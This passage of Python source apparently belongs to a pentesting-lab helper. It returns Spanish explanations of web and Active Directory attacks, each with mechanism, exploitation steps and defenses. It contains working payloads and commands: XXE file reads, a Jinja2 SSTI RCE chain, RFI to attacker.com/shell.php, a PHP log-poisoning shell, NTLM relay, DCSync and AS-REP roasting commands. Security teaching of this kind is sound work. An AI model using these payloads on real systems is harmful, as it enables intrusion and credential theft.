                "Un parser XML procesa DTDs (Document Type Definitions). "
                "Si el parser resuelve entidades externas, un atacante puede inyectar:\n"
                "<?xml version='1.0'?>\n"
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
                "<foo>&xxe;</foo>\n"
                "El servidor lee /etc/passwd y lo incluye en la respuesta."
            ),
            "cuando_aparece": "Aplicaciones que procesan XML: uploads de XML/SVG/XLSX/DOCX, "
            "endpoints SOAP, parsers de configuración, feeds RSS.",
            "como_explotar": (
                "1. Encontrar un endpoint que procese XML.\n"
                "2. Enviar payload XXE con entidad apuntando a file:///etc/passwd.\n"
                "3. Si hay respuesta: LFI completo.\n"
                "4. Para SSRF: SYSTEM 'http://169.254.169.254/'\n"
                "5. Blind XXE: usar Burp Collaborator o servidor propio para exfiltrar."
            ),
            "defensa": "Deshabilitar procesamiento de DTDs externos en el parser XML. "
            "En Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true).",
            "recursos": ["https://portswigger.net/web-security/xxe"],
        },
        "csrf": {
            "nombre": "CSRF — Cross-Site Request Forgery",
            "definicion": "El atacante hace que el navegador de la víctima envíe requests autenticados a una aplicación sin que la víctima lo sepa.",
            "mecanismo": (
                "La víctima está autenticada en banco.com. "
                "El atacante le envía un link o página con:\n"
                "<img src='http://banco.com/transfer?to=attacker&amount=1000'>\n"
                "El navegador incluye automáticamente las cookies de banco.com. "
                "El servidor lo procesa como request legítimo."
            ),
            "cuando_aparece": "Formularios que realizan acciones sensibles (cambio de contraseña, "
            "transferencias, cambio de email) sin tokens CSRF.",
            "como_explotar": (
                "1. Identificar acción sensible sin token CSRF.\n"
                "2. Capturar el request con Burp.\n"
                "3. Generar PoC HTML con el form apuntando al endpoint.\n"
                "4. Burp tiene generador: click derecho → Engagement tools → Generate CSRF PoC."
            ),
            "defensa": "Tokens CSRF únicos por sesión. SameSite=Strict en cookies. "
            "Verificar header Origin/Referer.",
            "recursos": ["https://portswigger.net/web-security/csrf"],
        },
        "ssti": {
            "nombre": "SSTI — Server-Side Template Injection",
            "definicion": "Input del usuario es procesado directamente por un motor de templates del servidor, permitiendo ejecutar código arbitrario.",
            "mecanismo": (
                "Una app renderiza: 'Hola {{ nombre }}' con Jinja2.\n"
                "Si el parámetro nombre viene del usuario sin sanitizar:\n"
                "nombre = '{{ 7*7 }}' → respuesta: 'Hola 49' → vulnerable.\n"
                "Payload de RCE en Jinja2 (Python):\n"
                "{{ self.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}"
            ),
            "cuando_aparece": "Aplicaciones que usan Jinja2 (Flask/Django), Twig (PHP), "
            "Freemarker (Java), Pebble, Velocity, Smarty. "
            "Frecuente en funciones de 'preview' o templates personalizables.",
            "como_explotar": (
                "1. Detectar: enviar {{ 7*7 }} — si responde 49 → vulnerable.\n"
                "2. Identificar el motor con payloads específicos (ver https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).\n"
                "3. Escalar a RCE con payload específico del motor."
            ),
            "defensa": "Nunca concatenar input del usuario directamente en templates. "
            "Usar render_template_string con variables como contexto separado, no interpoladas.",
            "recursos": [
                "https://portswigger.net/web-security/server-side-template-injection"
            ],
        },
        "lfi": {
            "nombre": "LFI/RFI — Local/Remote File Inclusion",
            "definicion": "LFI permite leer archivos del servidor. RFI permite incluir y ejecutar archivos remotos (PHP principalmente).",
            "mecanismo": (
                "PHP: include($_GET['page'])\n"
                "LFI: ?page=../../../etc/passwd → lee el archivo\n"
                "LFI con null byte (PHP < 5.3): ?page=../../../etc/passwd%00\n"
                "RFI: ?page=http://attacker.com/shell.php → ejecuta código remoto\n"
                "Log poisoning via LFI: contaminar /var/log/apache2/access.log con PHP, "
                "luego incluirlo via LFI → RCE."
            ),
            "cuando_aparece": "Parámetros 'page', 'file', 'include', 'template', 'doc', 'path'. "
            "Más común en PHP, pero posible en Python, Node y otros.",
            "como_explotar": (
                "1. LFI básico: ../../../etc/passwd\n"
                "2. LFI con wrapper PHP: ?page=php://filter/convert.base64-encode/resource=index.php (leer código fuente)\n"
                "3. Log poisoning: curl -H 'User-Agent: <?php system($_GET[cmd]); ?>' http://target\n"
                "   luego: ?page=/var/log/apache2/access.log&cmd=id\n"
                "4. RFI: ?page=http://kali/shell.php"
            ),
            "defensa": "Allowlist estricta de archivos permitidos. No usar input del usuario "
            "directamente en include/require. Deshabilitar allow_url_include en php.ini.",
            "recursos": ["https://book.hacktricks.xyz/pentesting-web/file-inclusion"],
        },
        "deserialization": {
            "nombre": "Deserialización insegura",
            "definicion": "Los datos serializados (objetos convertidos a bytes/string para transmisión) son deserializados sin validación, permitiendo ejecutar código al reconstruir objetos maliciosos.",
            "mecanismo": (
                "En Java: ObjectInputStream.readObject() ejecuta métodos del objeto durante la deserialización. "
                "Un objeto malicioso en la cadena de transformación puede ejecutar código arbitrario.\n"
                "En Python: pickle.loads() ejecuta __reduce__ del objeto → RCE directo.\n"
                "En PHP: unserialize() con magic methods __destruct() o __wakeup() → RCE/SQLi."
            ),
            "cuando_aparece": "Cookies en base64 que parecen objetos serializados, "
            "parámetros viewstate en .NET, campos hidden en formularios Java.",
            "como_explotar": (
                "Java: ysoserial para generar payloads de deserialización.\n"
                "Python: crear clase con __reduce__ que ejecute os.system().\n"
                "PHP: phpggc para generar cadenas de gadgets.\n"
                "Identificar: en Java empieza con 'rO0AB' (base64 de 0xACED), "
                "en PHP 'O:' o 'a:' al inicio."
            ),
            "defensa": "No deserializar input del usuario. Usar HMAC para firmar datos serializados. "
            "En Java: ObjectInputFilter para allowlist de clases.",
            "recursos": [
                "https://portswigger.net/web-security/deserialization",
                "https://github.com/frohoff/ysoserial",
            ],
        },
        "ntlm relay": {
            "nombre": "NTLM Relay Attack",
            "definicion": "Capturar un intento de autenticación NTLM y retransmitirlo en tiempo real hacia otro host, sin necesidad de crackear el hash.",
            "mecanismo": (
                "1. El atacante posiciona un relay (ntlmrelayx) entre víctima y destino.\n"
                "2. Provoca que la víctima intente autenticarse (responder captura peticiones NBT-NS).\n"
                "3. ntlmrelayx retransmite la autenticación hacia otro host.\n"
                "4. Si el hash es válido en el destino → acceso como ese usuario.\n"
                "Requisito: SMB signing deshabilitado en el host destino."
            ),
            "cuando_aparece": "Redes Windows corporativas. SMB signing deshabilitado por defecto "
            "en workstations (no en DCs). Muy frecuente en auditorías internas.",
            "como_explotar": (
                "crackmapexec smb <subnet>/24 --gen-relay-list targets.txt\n"
                "sudo responder -I eth0 -d -P  # NO activar SMB y HTTP en responder\n"
                "sudo impacket-ntlmrelayx -tf targets.txt -smb2support\n"
                "# Provocar autenticación: enviar link UNC a la víctima"
            ),
            "defensa": "Habilitar SMB signing en todas las máquinas. "
            "Deshabilitar LLMNR y NBT-NS. Tier model para admins.",
            "recursos": [
                "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay"
            ],
        },
        "acl abuse": {
            "nombre": "ACL Abuse — Active Directory",
            "definicion": "Los objetos de AD tienen ACLs (listas de control de acceso) que definen qué usuarios pueden hacer sobre ellos. Permisos mal configurados permiten escalar privilegios lateralmente.",
            "mecanismo": (
                "Permisos explotables más comunes:\n"
                "• GenericWrite → modificar atributos del objeto (forzar SPN, cambiar script de login)\n"
                "• GenericAll → control total del objeto\n"
                "• WriteOwner → cambiar el propietario (luego darte GenericAll)\n"
                "• WriteDACL → modificar los permisos del objeto\n"
                "• ForceChangePassword → cambiar contraseña sin conocer la actual\n"
                "• AllExtendedRights → incluye GetChangesAll → DCSync"
            ),
            "cuando_aparece": "En casi todos los entornos AD reales. BloodHound lo visualiza. "
            "Especialmente en delegaciones de helpdesk y service accounts.",
            "como_explotar": (
                "1. BloodHound → 'Outbound Object Control' desde tu usuario/grupo.\n"
                "2. Si GenericWrite sobre usuario: forzar SPN → Kerberoasting dirigido.\n"
                "3. Si GenericWrite sobre grupo: net rpc group addmem → añadirse al grupo.\n"
                "4. Si WriteDACL: PowerView Add-DomainObjectAcl para darte GenericAll."
            ),
            "defensa": "Auditar ACLs con BloodHound periódicamente. "
            "Principio de mínimo privilegio. No dar derechos extendidos a cuentas de servicio.",
            "recursos": [
                "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse"
            ],
        },
        "dcsync": {
            "nombre": "DCSync",
            "definicion": "Técnica que simula el comportamiento de un DC (controlador de dominio) para replicar credenciales, volcando todos los hashes NTLM del dominio.",
            "mecanismo": (
                "Los DCs se replican entre sí usando el protocolo MS-DRSR. "
                "Cualquier usuario con los permisos DS-Replication-Get-Changes y "
                "DS-Replication-Get-Changes-All puede 'pedir' credenciales como si fuera un DC. "
                "impacket-secretsdump implementa este protocolo sin necesitar código en el DC."
            ),
            "cuando_aparece": "Fase final de compromisos AD. Requiere: domain admin, "
            "exchange servers (tienen permisos de replicación), "
            "o usuarios con WriteDACL en el dominio.",
            "como_explotar": (
                "impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc\n"
                "# O con mimikatz (desde un proceso con privilegios):\n"
                "lsadump::dcsync /user:Administrator\n"
                "lsadump::dcsync /all /csv"
            ),
            "defensa": "Monitorizar replicación desde IPs que no son DCs (Event ID 4662). "
            "No dar permisos de replicación a cuentas que no son DCs.",
            "recursos": [
                "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
            ],
        },
        "bloodhound": {
            "nombre": "BloodHound — Metodología de uso",
            "definicion": "Herramienta que visualiza las relaciones en Active Directory como un grafo, revelando paths de ataque invisibles al análisis manual.",
            "mecanismo": (
                "BloodHound colecta datos del dominio (usuarios, grupos, permisos, sesiones, GPOs) "
                "y los carga en Neo4j. Mediante queries de Cypher encuentra los paths más cortos "
                "desde cualquier nodo comprometido hasta Domain Admin."
            ),
            "cuando_aparece": "Siempre que estés en un entorno AD con al menos una credencial de dominio.",
            "como_explotar": (
                "# Recolección (desde Linux):\n"
                "bloodhound-python -d <domain> -u <user> -p <pass> -ns <DC_IP> -c all --zip\n\n"
                "# Arrancar:\n"
                "sudo neo4j console &\n"
                "bloodhound &  → importar el ZIP\n\n"
                "# Queries esenciales:\n"
                "• Shortest Paths to Domain Admins from Owned Principals\n"
                "• Find Computers where Domain Users are Local Admin\n"
                "• Kerberoastable Accounts\n"
                "• Find AS-REP Roastable Users\n"
                "• Find Principals with DCSync Rights\n"
                "• Shortest Paths to Unconstrained Delegation Systems\n\n"
                "# Marcar nodos comprometidos:\n"
                "Click derecho → Mark as Owned\n"
                "Luego re-ejecutar queries para ver paths desde nodos propios."
            ),
            "defensa": "BloodHound Community Edition también está disponible para defensores — "
            "los blue teams lo usan para auditar y reducir la superficie de ataque AD.",
            "recursos": [
                "https://github.com/BloodHoundAD/BloodHound",
                "https://bloodhound.readthedocs.io",
            ],
        },
        "as-rep roasting": {
            "nombre": "AS-REP Roasting",
            "definicion": "Similar a Kerberoasting pero sin necesitar credenciales previas. Funciona contra usuarios con la opción 'Do not require Kerberos preauthentication' habilitada.",
            "mecanismo": (
                "Normalmente Kerberos requiere que el cliente se autentique antes de pedir un TGT. "
                "Si un usuario tiene pre-auth deshabilitada, el DC envía el AS-REP sin verificar "
                "quién lo pide. El AS-REP está cifrado con el hash del usuario → crackeable offline."
            ),
            "cuando_aparece": "Menos frecuente que Kerberoasting. Aparece en cuentas de servicio "
            "legacy o misconfiguraciones. BloodHound lo detecta con 'Find AS-REP Roastable Users'.",
            "como_explotar": (
                "# Sin credenciales (si tienes lista de usuarios):\n"
                "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC> -no-pass -format hashcat\n\n"
                "# Con credenciales (enumera automáticamente usuarios vulnerables):\n"
                "impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <DC> -request -format hashcat\n\n"
                "# Crackear:\n"
                "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
            ),
            "defensa": "Nunca deshabilitar pre-autenticación Kerberos. Auditar con PowerShell: "
            "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}",
            "recursos": [
                "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
            ],
        },
    }

    key = concept.lower().strip().replace("-", " ").replace("_", " ")
    matched = next((k for k in concepts if key in k or k in key), None)

    if matched:
        info = concepts[matched]
        return {
            "status": "success",
            "concept": info["nombre"],
            "definition": info["definicion"],
            "how_it_works": info["mecanismo"],
            "when_in_labs": info["cuando_aparece"],
            "how_to_exploit": info["como_explotar"],
            "defense": info["defensa"],
            "resources": info.get("recursos", []),
        }

    return {
        "status": "not_found",
        "message": f"'{concept}' no en este módulo. Pregunta directamente en el chat.",
        "available": list(concepts.keys()),
        "note": "Para conceptos base (SUID, path traversal, reverse shell, SSRF, IDOR, "
        "kerberoasting, pass the hash, JWT) usar explain_concept().",
    }
